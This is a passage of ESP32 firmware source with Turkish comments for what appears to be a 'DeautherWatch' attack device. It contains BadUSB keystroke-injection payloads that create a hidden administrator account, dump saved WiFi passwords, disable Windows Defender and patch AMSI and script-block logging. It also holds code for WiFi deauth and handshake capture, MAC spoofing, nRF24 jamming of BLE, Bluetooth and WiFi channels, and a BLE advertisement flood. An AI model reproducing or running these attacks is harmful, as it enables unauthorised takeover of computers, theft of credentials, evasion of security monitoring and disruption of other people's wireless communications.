    // 'I': TrQ'da Shift+i (0x0C) → büyük noktasız I üretir — PS ASCII 'I' için doğru
    case 'A': hidShift(0x04); break;
    case 'B': hidShift(0x05); break;
    case 'C': hidShift(0x06); break;
    case 'D': hidShift(0x07); break;
    case 'E': hidShift(0x08); break;
    case 'F': hidShift(0x09); break;
    case 'G': hidShift(0x0A); break;
    case 'H': hidShift(0x0B); break;
    case 'I': hidShift(0x0C); break;  // TrQ: Shift+i → büyük noktasız I (PS ASCII 'I')
    case 'J': hidShift(0x0D); break;
    case 'K': hidShift(0x0E); break;
    case 'L': hidShift(0x0F); break;
    case 'M': hidShift(0x10); break;
    case 'N': hidShift(0x11); break;
    case 'O': hidShift(0x12); break;
    case 'P': hidShift(0x13); break;
    case 'Q': hidShift(0x14); break;
    case 'R': hidShift(0x15); break;
    case 'S': hidShift(0x16); break;
    case 'T': hidShift(0x17); break;
    case 'U': hidShift(0x18); break;
    case 'V': hidShift(0x19); break;
    case 'W': hidShift(0x1A); break;
    case 'X': hidShift(0x1B); break;
    case 'Y': hidShift(0x1C); break;
    case 'Z': hidShift(0x1D); break;
    // ---- Sayılar ----
    case '0': hidTap(0x27); break;
    case '1': hidTap(0x1E); break;
    case '2': hidTap(0x1F); break;
    case '3': hidTap(0x20); break;
    case '4': hidTap(0x21); break;
    case '5': hidTap(0x22); break;
    case '6': hidTap(0x23); break;
    case '7': hidTap(0x24); break;
    case '8': hidTap(0x25); break;
    case '9': hidTap(0x26); break;
    // ---- Boşluk ve kontrol ----
    case ' ':  hidTap(0x2C); break;
    case '\n': hidEnter();   break;   // DÜZELTİLDİ: '\\n' → '\n' (geçerli C char literal)
    case '\t': hidTap(0x2B); break;   // DÜZELTİLDİ: '\\t' → '\t' (geçerli C char literal)
    // ---- Noktalama — Windows Türkçe Q ANSI (KBDTR.DLL) ----
    // Referans tablo:
    //   0x2D(-tuşu)  normal=*  Shift=?
    //   0x2E(=tuşu)  normal=-  Shift=_
    //   0x2F([tuşu)  normal=ğ  Shift=Ğ
    //   0x30(]tuşu)  normal=ü  Shift=Ü
    //   0x33(;tuşu)  normal=ş  Shift=Ş
    //   0x34('tuşu)  normal=i  Shift=İ  (noktalı i)
    //   0x36(,tuşu)  normal=ö  Shift=Ö
    //   0x37(.tuşu)  normal=ç  Shift=Ç
    //   0x38(/tuşu)  normal=.  Shift=:
    //   0x56(ISO key) normal=, Shift=;  (TrQ ANSI'daki extra tuş)
    //   AltGr+q=@  AltGr+2=#  AltGr+7={  AltGr+8=[  AltGr+9=]
    //   AltGr+0=}  AltGr+-=\  AltGr+e=€  AltGr+4=$
    // Tire - : = tuşu (0x2E) → -
    case '-':  hidTap(0x2E);   break;
    // Altçizgi _ : Shift+= (0x2E) → _
    case '_':  hidShift(0x2E); break;
    // Nokta . : / tuşu (0x38) → .
    case '.':  hidTap(0x38);   break;
    // İki nokta : : Shift+/ (0x38) → :
    case ':':  hidShift(0x38); break;
    // Virgül , : DÜZELTİLDİ — ISO extra key (0x56) → TrQ ANSI'da virgül
    // 0x31 (backslash key) TrQ ANSI'da olmayabilir; 0x56 daha güvenli
    case ',':  hidTap(0x56);   break;
    // Noktalı virgül ; : DÜZELTİLDİ — Shift+ISO extra (0x56) → ;
    // 0x31+Shift önceden kullanılıyordu ama 0x56 TrQ ANSI standardı
    case ';':  hidShift(0x56); break;
    // Ünlem ! : Shift+1 → !
    case '!':  hidShift(0x1E); break;
    // Çift tırnak " : Shift+2 → "
    case '"':  hidShift(0x1F); break;
    // Şapka ^ : Shift+3 → ^
    case '^':  hidShift(0x20); break;
    // Dolar $ : AltGr+4
    case '$':  hidKey(KEY_MOD_RALT, 0x21); break;
    // Yüzde % : Shift+5 → %
    case '%':  hidShift(0x22); break;
    // Ve & : Shift+6 → &
    case '&':  hidShift(0x23); break;
    // Bölü / : Shift+7 → /
    case '/':  hidShift(0x24); break;
    // Sol parantez ( : Shift+8 → (
    case '(':  hidShift(0x25); break;
    // Sağ parantez ) : Shift+9 → )
    case ')':  hidShift(0x26); break;
    // Eşittir = : Shift+0 → =
    case '=':  hidShift(0x27); break;
    // Yıldız * : - tuşu (0x2D) → *
    case '*':  hidTap(0x2D);   break;
    // Soru işareti ? : Shift+- (0x2D) → ?
    case '?':  hidShift(0x2D); break;
    // Artı + : AltGr+= (0x2E) → TrQ ANSI'da + üretir
    case '+':  hidKey(KEY_MOD_RALT, 0x2E); break;
    // Süslü parantezler: AltGr kombinasyonları
    case '{':  hidKey(KEY_MOD_RALT, 0x24); break;  // AltGr+7
    case '}':  hidKey(KEY_MOD_RALT, 0x27); break;  // AltGr+0
    case '[':  hidKey(KEY_MOD_RALT, 0x25); break;  // AltGr+8
    case ']':  hidKey(KEY_MOD_RALT, 0x26); break;  // AltGr+9
    // Ters bölü \ : AltGr+- (0x2D)
    case '\\': hidKey(KEY_MOD_RALT, 0x2D); break;
    // Dikey çizgi | : AltGr+< (ISO 0x64) veya AltGr+- bazı TrQ'da
    case '|':  hidKey(KEY_MOD_RALT, 0x64); break;
    // Hash # : AltGr+3 (0x20)
    case '#':  hidKey(KEY_MOD_RALT, 0x20); break;
    // At @ : AltGr+q (0x14)
    case '@':  hidKey(KEY_MOD_RALT, 0x14); break;
    // Küçük/büyük işaretler: ISO extra key
    case '<':  hidTap(0x64);   break;
    case '>':  hidShift(0x64); break;
    // Tek tırnak ': TrQ'da ' tuşu (0x34) noktalı i üretir — PS komutlarında " kullan
    case '\'': hidTap(0x34);   break;
    // Backtick ` : TrQ'da standart yok — PS'de [char]96 kullan
    case '`':  hidTap(0x35);   break;
    default: break;
  }
  delay(HID_DELAY_CHAR);
}

// ---- Türkçe özel karakter gönderici (özel token ile) ----
// Kullanım: typ_tr_special("G_") → ğ, "GU_" → Ğ vb.
// Kodda string yerine bu fonksiyonu çağırıyoruz
void sendTR_g()  { hidTap(0x2F); }           // ğ (fiziksel [ tuşu)
void sendTR_G()  { hidShift(0x2F); }          // Ğ
void sendTR_u()  { hidTap(0x30); }            // ü (fiziksel ] tuşu)
void sendTR_U()  { hidShift(0x30); }          // Ü
void sendTR_s()  { hidTap(0x33); }            // ş (fiziksel ; tuşu)
void sendTR_S()  { hidShift(0x33); }          // Ş
void sendTR_i()  { hidTap(0x0C); }            // ı (fiziksel i tuşu → noktasız i)
void sendTR_I()  { hidShift(0x0C); }          // I (büyük noktasız)
void sendTR_di() { hidTap(0x34); }            // i (noktalı — fiziksel ' tuşu)
void sendTR_dI() { hidShift(0x34); }          // İ (büyük noktalı — fiziksel Shift+')
void sendTR_o()  { hidTap(0x36); }            // ö (fiziksel , tuşu)
void sendTR_O()  { hidShift(0x36); }          // Ö
void sendTR_c()  { hidTap(0x37); }            // ç (fiziksel . tuşu)
void sendTR_C()  { hidShift(0x37); }          // Ç

// ---- ASCII / UTF-8 Türkçe string gönder ----
void typ_str(const char* s) {
  if (!s || !usbHIDReady) return;
  while (*s) {
    uint8_t c1 = (uint8_t)*s++;
    if (c1 == 0xC3 && *s) {
      uint8_t c2 = (uint8_t)*s++;
      if (c2 == 0xB6) sendTR_o();       // ö
      else if (c2 == 0x96) sendTR_O();  // Ö
      else if (c2 == 0xA7) sendTR_c();  // ç
      else if (c2 == 0x87) sendTR_C();  // Ç
      else if (c2 == 0xBC) sendTR_u();  // ü
      else if (c2 == 0x9C) sendTR_U();  // Ü
      else typ_tr_char((char)c2);
    } else if (c1 == 0xC4 && *s) {
      uint8_t c2 = (uint8_t)*s++;
      if (c2 == 0x9F) sendTR_g();       // ğ
      else if (c2 == 0x9E) sendTR_G();  // Ğ
      else if (c2 == 0xB1) sendTR_i();  // ı
      else if (c2 == 0xB0) sendTR_dI(); // İ
      else typ_tr_char((char)c2);
    } else if (c1 == 0xC5 && *s) {
      uint8_t c2 = (uint8_t)*s++;
      if (c2 == 0x9F) sendTR_s();       // ş
      else if (c2 == 0x9E) sendTR_S();  // Ş
      else typ_tr_char((char)c2);
    } else {
      typ_tr_char((char)c1);
    }
  }
}

// Win+R → Run dialog → komut yaz → Enter
void hidWinRun(const char* cmd) {
  hidWin(0x15);          // Win+R (R=0x15)
  delay(HID_DELAY_CMD);
  typ_str(cmd);
  delay(200);
  hidEnter();
  delay(HID_DELAY_CMD);
}

// PowerShell'i admin olarak aç (UAC bypass yok, sadece normal PS)
void openPowerShell() {
  // Win+R → powershell → Enter
  hidWin(0x15);
  delay(HID_DELAY_CMD);
  typ_str("powershell");
  delay(200);
  hidEnter();
  delay(HID_DELAY_READY);
}

void drawBadusbRunning(); // forward declaration

// ============================================================
// BadUSB Payload 0: System Info Popup
// ============================================================
void badusb_sysinfo() {
  strlcpy(badusbStatus, "PS aciliyor...", 32);
  drawBadusbRunning();
  openPowerShell();
  strlcpy(badusbStatus, "Yaziliyor...", 32);
  drawBadusbRunning();

  typ_str("Add-Type -AssemblyName System.Windows.Forms");
  hidEnter(); delay(400);
  typ_str("$h=[System.Net.Dns]::GetHostName()");
  hidEnter(); delay(150);
  typ_str("$o=[System.Environment]::OSVersion.VersionString");
  hidEnter(); delay(150);
  typ_str("$u=$env:USERNAME");
  hidEnter(); delay(150);
  typ_str("$a=if([System.IntPtr]::Size -eq 8){");
  hidShift(0x1F); typ_str("x64"); hidShift(0x1F);
  typ_str("}else{");
  hidShift(0x1F); typ_str("x86"); hidShift(0x1F);
  typ_str("}");
  hidEnter(); delay(150);
  typ_str("$r=[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)");
  hidEnter(); delay(500);
  typ_str("$nl=[char]10");
  hidEnter(); delay(150);
  typ_str("$msg=");
  hidShift(0x1F);
  typ_str("HOST: $($h)$($nl)OS: $($o)$($nl)USER: $($u)$($nl)ARCH: $($a)$($nl)RAM: $($r)GB");
  hidShift(0x1F);
  hidEnter(); delay(150);
  typ_str("[System.Windows.Forms.MessageBox]::Show($msg,");
  hidShift(0x1F); typ_str("SysInfo"); hidShift(0x1F);
  typ_str(")");
  hidEnter();

  strlcpy(badusbStatus, "Done!", 32);
  drawBadusbRunning();
}

// ============================================================
// BadUSB Payload 1: Add Admin User (gizli, silinebilir)
// ============================================================
void badusb_addadmin() {
  strlcpy(badusbStatus, "AddAdmin...", 32);
  drawBadusbRunning();
  openPowerShell();
  strlcpy(badusbStatus, "Yaziliyor...", 32);
  drawBadusbRunning();

  // Net user komutu — PS üzerinden, UAC gerektirmez (admin PS ise)
  // Kullanıcı adı ve şifre sabit — gerekirse değiştir
  typ_str("net user HiddenOps P@ssw0rd!");
  typ_tr_char('-'); typ_str("add");
  hidEnter(); delay(600);

  typ_str("net localgroup Administrators HiddenOps");
  typ_tr_char('-'); typ_str("add");
  hidEnter(); delay(600);

  // Kullanıcıyı gizle (registry)
  typ_str("reg add ");
  hidShift(0x1F);
  typ_str("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList");
  hidShift(0x1F);
  typ_str(" /v HiddenOps /t REG_DWORD /d 0 /f");
  hidEnter(); delay(400);

  typ_str("exit");
  hidEnter();

  strlcpy(badusbStatus, "Done!", 32);
  drawBadusbRunning();
}

// ============================================================
// BadUSB Payload 2: WiFi Passwords — tüm profiller
// ============================================================
void badusb_wifipass() {
  // Fix #4: Önceki kod iki blok içeriyordu — bozuk ilk blok kaldırıldı.
  // Sadece tek, temiz netsh bloğu gönderiliyor.
  strlcpy(badusbStatus, "WiFiPass...", 32);
  drawBadusbRunning();
  openPowerShell();
  strlcpy(badusbStatus, "Yaziliyor...", 32);
  drawBadusbRunning();

  typ_str("Add-Type -AssemblyName System.Windows.Forms");
  hidEnter(); delay(400);

  typ_str("$profiles=(netsh wlan show profiles)|");
  hidShift(0x64);
  typ_str("Select-String 'All User Profile'|");
  hidShift(0x64);
  typ_str("ForEach-Object{($_ -split ':')[1].Trim()}");
  hidEnter(); delay(300);

  typ_str("$nl=[char]10");
  hidEnter(); delay(100);

  typ_str("$out=");
  hidShift(0x1F); hidShift(0x1F);  // "" boş string
  hidEnter(); delay(100);

  typ_str("foreach($p in $profiles){$r=(netsh wlan show profile name=$p key=clear 2>$null|Select-String 'Key Content');if($r){$k=($r -split ':')[1].Trim()}else{$k=");
  hidShift(0x1F); typ_str("N/A"); hidShift(0x1F);
  typ_str("};$out=$out");
  hidShift(0x1F); typ_str("$($p): $($k)$($nl)"); hidShift(0x1F);
  typ_str("}");
  hidEnter(); delay(400);

  typ_str("[System.Windows.Forms.MessageBox]::Show($out,");
  hidShift(0x1F); typ_str("WiFi Passwords"); hidShift(0x1F);
  typ_str(")");
  hidEnter();

  strlcpy(badusbStatus, "Done!", 32);
  drawBadusbRunning();
}

// ============================================================
// BadUSB Payload 4: Defender Disable (Kalıcı, Registry)
// ============================================================
void badusb_defenderoff() {
  strlcpy(badusbStatus, "Defender...", 32);
  drawBadusbRunning();
  openPowerShell();
  strlcpy(badusbStatus, "Yaziliyor...", 32);
  drawBadusbRunning();

  // Real-time protection kapat (admin PS gerekir)
  typ_str("Set-MpPreference -DisableRealtimeMonitoring $true");
  hidEnter(); delay(400);

  typ_str("Set-MpPreference -DisableBehaviorMonitoring $true");
  hidEnter(); delay(400);

  typ_str("Set-MpPreference -DisableIOAVProtection $true");
  hidEnter(); delay(400);

  typ_str("Set-MpPreference -DisableBlockAtFirstSeen $true");
  hidEnter(); delay(400);

  // Tamper protection kapalıysa registry ile de kapat
  typ_str("reg add ");
  hidShift(0x1F);
  typ_str("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender");
  hidShift(0x1F);
  typ_str(" /v DisableAntiSpyware /t REG_DWORD /d 1 /f");
  hidEnter(); delay(400);

  typ_str("exit");
  hidEnter();

  strlcpy(badusbStatus, "Done!", 32);
  drawBadusbRunning();
}

// ============================================================
// BadUSB Payload 5: AMSI Bypass (PS script execution unlock)
// ============================================================
void badusb_amsibypass() {
  strlcpy(badusbStatus, "AMSI Bypass...", 32);
  drawBadusbRunning();
  openPowerShell();
  strlcpy(badusbStatus, "Yaziliyor...", 32);
  drawBadusbRunning();

  // Execution policy bypass
  typ_str("Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force");
  hidEnter(); delay(400);

  // AMSI patching — reflection ile AmsiScanBuffer'ı patch et
  typ_str("$a=[Ref].Assembly.GetType(");
  hidShift(0x1F); typ_str("System.Management.Automation.AmsiUtils"); hidShift(0x1F);
  typ_str(")");
  hidEnter(); delay(150);

  typ_str("$b=$a.GetField(");
  hidShift(0x1F); typ_str("amsiInitFailed"); hidShift(0x1F);
  typ_str(",");
  hidShift(0x1F); typ_str("NonPublic,Static"); hidShift(0x1F);
  typ_str(")");
  hidEnter(); delay(150);

  typ_str("$b.SetValue($null,$true)");
  hidEnter(); delay(200);

  // ScriptBlock logging kapat
  typ_str("$c=[Ref].Assembly.GetType(");
  hidShift(0x1F); typ_str("System.Management.Automation.ScriptBlock"); hidShift(0x1F);
  typ_str(")");
  hidEnter(); delay(150);

  typ_str("$d=$c.GetField(");
  hidShift(0x1F); typ_str("signatures"); hidShift(0x1F);
  typ_str(",");
  hidShift(0x1F); typ_str("NonPublic,Static"); hidShift(0x1F);
  typ_str(")");
  hidEnter(); delay(150);

  typ_str("if($d){$d.SetValue($null,(New-Object Collections.Generic.HashSet[string]))}");
  hidEnter(); delay(200);

  typ_str("Write-Host ");
  hidShift(0x1F); typ_str("AMSI Bypassed"); hidShift(0x1F);
  hidEnter();

  strlcpy(badusbStatus, "Done!", 32);
  drawBadusbRunning();
}

// ============================================================
// BadUSB Payload 5_LOCK:
// ============================================================
// BadUSB Payload 8: Lock Screen
// ============================================================
void badusb_lockscreen() {
  strlcpy(badusbStatus, "Locking...", 32);
  drawBadusbRunning();
  hidKey(KEY_MOD_LGUI, 0x0F);  // Win+L
  delay(300);
  strlcpy(badusbStatus, "Done!", 32);
  drawBadusbRunning();
}

// ============================================================
// BadUSB Payload Dispatcher
// ============================================================
void badusb_run(int idx) {
  if (!usbHIDReady) {
    strlcpy(badusbStatus, "USB N/A!", 32);
    drawBadusbRunning();
    return;
  }
  // Bekleme ekranı
  strlcpy(badusbStatus, "Hazırlık 2sn...", 32);
  drawBadusbRunning();
  delay(2000);

  strlcpy(badusbStatus, "Calisiyor...", 32);
  drawBadusbRunning();

  switch (idx) {
    case 0: badusb_sysinfo();     break;
    case 1: badusb_addadmin();    break;
    case 2: badusb_wifipass();    break;
    case 3: badusb_defenderoff(); break;
    case 4: badusb_amsibypass();  break;
    case 5: badusb_lockscreen();  break;
    default: strlcpy(badusbStatus, "???", 32); break;
  }

  drawBadusbRunning();  // Son durumu göster
}

// ============================================================
// Enums
// ============================================================




// ============================================================
// Structs
// ============================================================
struct APRecord {
  char ssid[33];
  uint8_t bssid[6];
  int8_t rssi;
  uint8_t channel;
  uint8_t enc;
  bool selected;
  bool hidden;
  bool pmf;
  char vendor[12];
};

struct StationRecord {
  uint8_t mac[6];
  uint8_t apBssid[6];
  int8_t rssi;
  uint32_t lastSeen;
  uint16_t packets;
  bool selected;
};

struct ProbeRecord {
  uint8_t mac[6];
  char ssid[33];
  int8_t rssi;
  uint32_t lastSeen;
  uint16_t count;
  bool wildcard;
};

struct HandshakeRecord {
  char ssid[33];
  uint8_t bssid[6];
  uint8_t clientMac[6];
  uint8_t step;
  uint32_t timestamp;
};

struct SSIDRecord {
  char name[33];
  bool wpa2;
  bool selected;
};



// ============================================================
// Global Variables
// ============================================================
Adafruit_SSD1306 display(OLED_W, OLED_H, &Wire, OLED_RESET);

APRecord*        apList      = nullptr;
StationRecord*   staList     = nullptr;
ProbeRecord*     probeList   = nullptr;
HandshakeRecord* hsList      = nullptr;
SSIDRecord*      ssidList    = nullptr;

int apCount       = 0;
int staCount      = 0;
int probeCount    = 0;
int hsCount       = 0;
int ssidCount     = 0;

AppMode appMode   = MODE_INTRO;
AppMode prevMode  = MODE_MENU;
ScanMode scanMode = SCAN_NONE;

// Menu navigation
MenuItem menuItems[28];
int menuCount      = 0;
int menuCursor     = 0;
int menuScroll     = 0;
int scrollOffset   = 0;
uint32_t scrollTimer = 0;

BtnState btnUp, btnDown, btnSel;

// Attack state
uint8_t attackFlags = 0;
bool attackRunning  = false;
uint32_t pktSent    = 0;
uint32_t lastTxTime = 0;
uint32_t liveFlash  = 0;
bool liveState      = false;

// TX rate (attack tick/second) — her tick içinde burst var, gerçek pkt sayısı daha yüksek
// 1→1tick/s, 5→5tick/s, 20→20tick/s, 50→50tick/s
// 50tick/s × 7pkt/tick = 350 deauth/s — kondansatörsüz güvenli üst sınır
int txRateOptions[] = {1, 5, 20, 50};
int txRateIdx       = 2;  // default 20 tick/s

// Channel
uint8_t currentChannel = 1;

// Packet ring buffer — DRAM allocated (IRAM_ATTR on data arrays causes LoadStoreError 0x4037xxxx EXCCAUSE 0x3)
static DRAM_ATTR uint16_t packetRing[PKT_RING];
volatile int      pktHead = 0;
volatile uint32_t pktCount = 0;
volatile uint32_t pktPerSec = 0;
volatile uint32_t deauthCount = 0;
uint32_t lastPktSample = 0;
uint32_t lastPktVal = 0;

// ---- Promiscuous defer ring ----
#define PROM_RING_SIZE   8
#define PROM_MAX_FRAME 256
struct PromFrame {
  uint8_t  data[PROM_MAX_FRAME];
  int      len;
  int8_t   rssi;
  bool     ready;
};
static PromFrame promRing[PROM_RING_SIZE];      // normal DRAM
static volatile int promWriteIdx = 0;           // volatile: ISR yazar, loop okur
static int promReadIdx = 0;
static DRAM_ATTR uint8_t _promStageBuf[PROM_MAX_FRAME];

// RSSI ring
int8_t rssiRing[RSSI_RING];
int rssiHead = 0;
int8_t rssiMin, rssiMax;
int32_t rssiSum;
uint32_t rssiTimer = 0;
int rssiSamples = 0;

// Channel analyzer
uint8_t chApCount[14];
int8_t  chAvgRssi[14];
char    chBestSSID[14][17];
int     chScanState   = 0;
uint32_t chScanTimer  = 0;
bool chScanDone       = false;

// Clock
uint32_t clockBase    = 0;
uint32_t clockOffsetS = 43200; // 12:00:00

// MAC
uint8_t origMac[6];
uint8_t activeMac[6];
bool macSpoofed = false;

// Deauth detector
volatile bool deauthDetected = false;
uint8_t deauthSrcMac[6];
char    deauthTargetSSID[33];
uint32_t deauthFlashTimer = 0;

// Detail view index
int detailIdx = 0;

// Sub-menu context: 0=main, 1=scan, 2=show
int subMenuCtx = 0;

// Handshake sniffer mode
bool hsSniffActive   = false;
uint8_t hsLockChannel = 0;  // Sniff aktifken kilitli kalınacak kanal (0=lock yok)

// BLE
struct BLEDevRecord {
  char name[32];
  char addr[18];
  int  rssi;
  bool hidden;   // listeden sil işareti
};
#define MAX_BLE_DEV 20
BLEDevRecord bleDevList[MAX_BLE_DEV];
int  bleDevCount    = 0;
bool bleScanning    = false;
bool bleAttacking   = false;   // BLE saldırısı aktif mi
uint32_t bleAtkTimer = 0;
int  bleAtkIdx      = 0;       // spam sayacı
int  bleAtkMode     = 0;       // 0=deauth 1=android 2=ios
int  bleSelectedDev = -1;      // seçili cihaz indexi
BLEAdvertising* bleAdv  = nullptr;
BLEScan*        bleScan = nullptr;

// ============================================================
// BLE / BT Fonksiyon İmplementasyonları
// ============================================================

bool bleInitDone = false;

void initBLE() {
  if (bleInitDone) return;
  BLEDevice::init("DeautherWatch");
  bleAdv  = BLEDevice::getAdvertising();
  bleScan = BLEDevice::getScan();
  bleScan->setActiveScan(true);
  bleScan->setInterval(100);
  bleScan->setWindow(99);
  bleInitDone = true;
}

int bleVisibleCount() {
  int c = 0;
  for (int i = 0; i < bleDevCount; i++) if (!bleDevList[i].hidden) c++;
  return c;
}

int bleVisibleIdx(int visPos) {
  int c = 0;
  for (int i = 0; i < bleDevCount; i++) {
    if (!bleDevList[i].hidden) {
      if (c == visPos) return i;
      c++;
    }
  }
  return -1;
}

class BLECbScan : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) override {
    String addr = dev.getAddress().toString().c_str();
    for (int i = 0; i < bleDevCount; i++) {
      if (addr == bleDevList[i].addr) {
        bleDevList[i].rssi = dev.getRSSI();
        return;
      }
    }
    int newRssi = dev.getRSSI();
    if (bleDevCount < MAX_BLE_DEV) {
      BLEDevRecord& r = bleDevList[bleDevCount++];
      strlcpy(r.addr, addr.c_str(), 18);
      strlcpy(r.name, dev.haveName() ? dev.getName().c_str() : "?", 32);
      r.rssi   = newRssi;
      r.hidden = false;
    } else {
      // Find device with lowest RSSI to replace if new device is stronger
      int minIdx = -1;
      int minRssi = 0;
      for (int i = 0; i < bleDevCount; i++) {
        if (!bleDevList[i].hidden) {
          if (minIdx == -1 || bleDevList[i].rssi < minRssi) {
            minRssi = bleDevList[i].rssi;
            minIdx = i;
          }
        }
      }
      if (minIdx != -1 && newRssi > minRssi) {
        BLEDevRecord& r = bleDevList[minIdx];
        strlcpy(r.addr, addr.c_str(), 18);
        strlcpy(r.name, dev.haveName() ? dev.getName().c_str() : "?", 32);
        r.rssi   = newRssi;
        r.hidden = false;
      }
    }
  }
};
static BLECbScan bleCbScan;

void bleStartScan() {
  initBLE();
  bleDevCount = 0;
  bleScanning = true;
  bleScan->setAdvertisedDeviceCallbacks(&bleCbScan);
  bleScan->start(0, nullptr, false);  // async
}

void bleStopScan() {
  if (bleScan) bleScan->stop();
  bleScanning = false;
}

// BLE Deauth / Spam helpers
static const uint8_t BLE_DEAUTH_PKT[] = {
  0x00,0x00,0x1a,0x00, 0x02,0xc0,0x00,0xa0,
  0xd3,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
  0x0a,0x00,0x00,0x00
};

void bleJamTaskFn(void* pv) {
  uint8_t pkt[32];
  while (bleJamming) {
    if (thermalThrottle) { vTaskDelay(50); continue; }
    // 3 BLE advertisement kanalının hepsine sırayla burst gönder
    // Her kanalda 8 paket → PLL lock (~130µs) + TX (~128µs/paket@2Mbps) = ~1ms/kanal
    // Toplam: ~3ms/tur → saniyede ~333 tam sweep
    for (int c = 0; c < JAM_CHAN_COUNT && bleJamming; c++) {
      nrfRadio.setChannel(BLE_ADV_CHANNELS[c]);
      for (int b = 0; b < 8 && bleJamming; b++) {
        // esp_random() yerine XOR-shift — ISR güvenli, daha hızlı
        uint32_t r = esp_random();
        memcpy(pkt,      &r, 4);
        r = esp_random(); memcpy(pkt + 4,  &r, 4);
        r = esp_random(); memcpy(pkt + 8,  &r, 4);
        r = esp_random(); memcpy(pkt + 12, &r, 4);
        r = esp_random(); memcpy(pkt + 16, &r, 4);
        r = esp_random(); memcpy(pkt + 20, &r, 4);
        r = esp_random(); memcpy(pkt + 24, &r, 4);
        r = esp_random(); memcpy(pkt + 28, &r, 4);
        nrfRadio.writeFast(pkt, 32);
        jamPktCount++;
      }
    }
    jamChanIdx = (jamChanIdx + 1) % JAM_CHAN_COUNT;
    vTaskDelay(1);  // WDT besle
  }
  vTaskDelete(nullptr);
}

void btJamTaskFn(void* pv) {
  uint8_t pkt[32];
  uint32_t wdtTimer = millis();
  while (btClassicJamActive) {
    if (thermalThrottle) { vTaskDelay(50); continue; }
    // BT Classic FHSS: 79 kanal, 1600 hop/s → her kanal ~625µs kullanılıyor.
    // Sweep tam turunu <625µs'de tamamlamak için her kanalda 2 paket gönder.
    // 2Mbps, 32 byte: ~128µs TX + ~130µs PLL lock = ~260µs/kanal → 79 kanal ~20ms/tur.
    // Bu yeterli — BT hop her kanalda bizi en az 1 kez yakalıyor.
    for (int burst = 0; burst < 2 && btClassicJamActive; burst++) {
      uint32_t r0 = esp_random(), r1 = esp_random(),
               r2 = esp_random(), r3 = esp_random(),
               r4 = esp_random(), r5 = esp_random(),
               r6 = esp_random(), r7 = esp_random();
      memcpy(pkt,      &r0, 4); memcpy(pkt + 4,  &r1, 4);
      memcpy(pkt + 8,  &r2, 4); memcpy(pkt + 12, &r3, 4);
      memcpy(pkt + 16, &r4, 4); memcpy(pkt + 20, &r5, 4);
      memcpy(pkt + 24, &r6, 4); memcpy(pkt + 28, &r7, 4);
      nrfRadio.setChannel(btJamSweepCh);
      nrfRadio.writeFast(pkt, 32);
      btJamPktCount++;
    }

    // Ring buffer'a pkt/s için örnek ekle
    uint32_t now = millis();
    if (now - btJamLastSample >= 100) {
      uint32_t delta = btJamPktCount - btJamPktLast;
      btJamRing[btJamRingHead] = (uint16_t)(delta > 65535 ? 65535 : delta);
      btJamRingHead = (btJamRingHead + 1) % BT_JAM_RING;
      btJamPktPerSec = delta * (1000 / 100);  // 100ms örnek → /s'ye çevir
      btJamPktLast   = btJamPktCount;
      btJamLastSample = now;
    }

    btJamSweepCh++;
    if (btJamSweepCh > BT_SWEEP_MAX) btJamSweepCh = BT_SWEEP_MIN;

    // WDT: her 50ms'de bir yield
    if (millis() - wdtTimer >= 50) { wdtTimer = millis(); vTaskDelay(1); }
  }
  vTaskDelete(nullptr);
}

void nrfWifiJamTaskFn(void* pv) {
  while (nrfWifiJamActive) {
    if (thermalThrottle) { vTaskDelay(50); continue; }
    uint8_t baseCh = wifiChToNrf(nrfWifiJamCh);
    static const int8_t offsets[] = {-10,-5,0,5,10};
    for (int o = 0; o < 5 && nrfWifiJamActive; o++) {
      int ch = baseCh + offsets[o];
      if (ch < 0) ch = 0;
      if (ch > 125) ch = 125;
      nrfRadio.setChannel((uint8_t)ch);
      uint8_t pkt[32];
      for (int i = 0; i < 32; i++) pkt[i] = (uint8_t)(esp_random() & 0xFF);
      nrfRadio.writeFast(pkt, 32);
      nrfWifiJamTimer++;
    }
    vTaskDelay(1);
  }
  vTaskDelete(nullptr);
}

void bleJamStart() {
  initBLE();
  if (!nrfInitDone || nrfInitFailed) return;
  bleJamming = true;
  jamChanIdx = 0;
  jamPktCount = 0;
  jamTimer = 0;
  // Stack 4096: nRF24 SPI + esp_random() için 2048 az geliyordu (fix #6)
  xTaskCreatePinnedToCore(bleJamTaskFn, "bleJam", 4096, nullptr, 4, &bleJamTaskHandle, 0);
}

void bleJamStop() {
  bleJamming = false;
  bleJamTaskHandle = nullptr;
}

void bleJamTick() {
  // FreeRTOS task handles timing; tick just updates display counters
}

static const uint8_t IOS_SPAM_TYPES[] = {0x0F, 0x0E, 0x0A, 0x0B, 0x06, 0x01, 0x14};
#define IOS_SPAM_TYPE_COUNT 7

void bleAttackTick() {
  if (!bleAttacking) return;
  if (millis() - bleAtkTimer < 30) return;  // 30ms → ~33 döngü/s
  bleAtkTimer = millis();

  // Mode 0 (Targeted BLE Jam/Deauth) için cihaz kontrolü
  if (bleAtkMode == 0) {
    int ri = bleVisibleIdx(bleSelectedDev);
    if (ri < 0 || ri >= bleDevCount) { bleAttacking = false; return; }
  }

  initBLE();
  if (!bleAdv) return;

  BLEAdvertisementData advData;
  BLEAdvertisementData scanData;

  switch (bleAtkMode) {
    case 0: {
      // ============================================================
      // BLE Bozma — Çok Katmanlı Advertisement Flood
      // ============================================================
      // BLE'de "deauth" kavramı WiFi gibi değil: Tek gerçek yöntem hedef
      // cihazın advertisement kanalını gürültüyle boğmak ve sahte advertisement
      // flood yaparak BLE stack'ini meşgul etmektir.
      //
      // GATT connect → disconnect yaklaşımı KALDIRILDI çünkü:
      //   - connect() çağrısı 300-1500ms bloklama yapıyor → UI donuyor
      //   - FreeRTOS task wrapper'ı bile heap sızıntısı ve BLE stack
      //     re-entrancy sorunlarına yol açıyor
      //   - Etkisi neredeyse sıfır: hedef cihaz bağlantıyı normal kesme
      //     olarak görüyor, kullanıcı fark etmiyor
      //
      // Yeni strateji — 3 fazlı döngü (her tick farklı faz, UI donmuyor):
      //   Faz 0: Hedef MAC içeren connectable advertisement burst (10 adet)
      //   Faz 1: MAC clone non-connectable flood (10 adet)
      //   Faz 2: Minimum interval (3.75ms) tam bant doldurma (10 burst × 3 paket)
      //
